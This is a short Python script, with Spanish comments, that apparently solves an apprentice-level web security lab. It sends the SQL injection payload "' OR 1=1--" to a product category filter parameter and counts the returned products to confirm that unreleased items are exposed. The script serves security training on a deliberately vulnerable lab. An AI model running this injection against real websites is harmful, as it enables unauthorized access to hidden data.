# Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
# APPRENTICE

# This lab contains a SQL injection vulnerability in the product category filter. When the user selects a category, the application carries out a SQL query like the following:
# SELECT * FROM products WHERE category = 'Gifts' AND released = 1
# To solve the lab, perform a SQL injection attack that causes the application to display one or more unreleased products.

import requests #me permite haces consultas http
import sys
from bs4 import BeautifulSoup
import urllib3

# Evitando errores por pantalla
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
Payload = "' OR 1=1--"

def Obtener_Cantidad_Divs(Url,Payload):
    ParametroVulnerable = 'filter?category='
    SolicitudWeb = requests.get(Url + ParametroVulnerable + Payload, verify=False, proxies=proxies )
    Parseando = BeautifulSoup(SolicitudWeb.content, 'html.parser')
    EncontrandoSeccion = Parseando.find('section', class_='container-list-tiles')
    #Contando Divs dentro de la sección
    if EncontrandoSeccion:
        Divs = EncontrandoSeccion.find_all('div')
        return len(Divs)
    else:
        return 0 

def Sqli_Lab_01(Url):
    CantidadInyeccion = Obtener_Cantidad_Divs(Url,Payload)
    print(f"En la sección al inyectar el payload SQLi: {Payload}, hay : {CantidadInyeccion} divs")
    if CantidadInyeccion > CantidadBase:
        print("[+] Inyección SQL exitosa")
    else:
        print("[+] Inyección SQL fallida")
    
if __name__ == "__main__":
    try:
        Url = sys.argv[1].strip()
        CantidadBase = Obtener_Cantidad_Divs(Url,"Pets")
        print(f"En la sección al usar el parametro: Pets, hay originalmente: {CantidadBase} divs")
        Sqli_Lab_01(Url)      
    except IndexError:
        print("[-] Uso: %s <url> " % sys.argv[0])
        print('[-] Ejemplo %s www.example.com ' % sys.argv[0])
        sys.exit(-1)
    
